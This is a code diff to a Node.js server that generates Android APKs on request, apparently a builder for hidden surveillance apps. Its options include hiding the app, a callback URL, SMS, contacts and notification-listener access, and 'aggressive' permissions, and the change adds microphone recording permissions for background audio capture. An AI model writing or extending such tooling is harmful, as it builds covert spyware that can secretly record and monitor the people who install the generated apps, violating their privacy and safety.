@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableNotificationListener, aggressivePermissions } = req.body;
+    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, aggressivePermissions } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -241,6 +241,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableContactsPermission: enableContactsPermission === 'true',
                 enableStoragePermission: enableStoragePermission !== 'false', // Default to true
                 enableCameraPermission: enableCameraPermission === 'true',
+                enableMicrophonePermission: enableMicrophonePermission === 'true',
                 enableNotificationListener: enableNotificationListener === 'true',
                 aggressivePermissions: aggressivePermissions === 'true'
             };
@@ -270,6 +271,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     if (enableCameraPermission === 'true') {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
                         console.log('[APK] Adding CAMERA permission');
+                    }
+
+                    if (enableMicrophonePermission === 'true') {
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n';
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />\n';
+                        console.log('[APK] Adding RECORD_AUDIO and FOREGROUND_SERVICE_MICROPHONE permissions');
                     }
 
                     if (permissionsToAdd) {
